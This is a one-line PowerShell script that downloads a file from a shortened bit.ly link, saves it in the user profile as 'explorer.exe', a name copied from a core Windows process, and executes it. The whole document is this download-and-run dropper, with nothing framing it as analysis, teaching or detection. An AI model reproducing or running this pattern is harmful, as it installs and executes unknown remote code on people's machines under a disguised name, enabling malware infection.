# Script
$url = "https://bit.ly/3RBgznq"; $destination = "$env:USERPROFILE\explorer.exe"; Invoke-WebRequest -Uri $url -OutFile $destination; Invoke-Expression -Command $destination
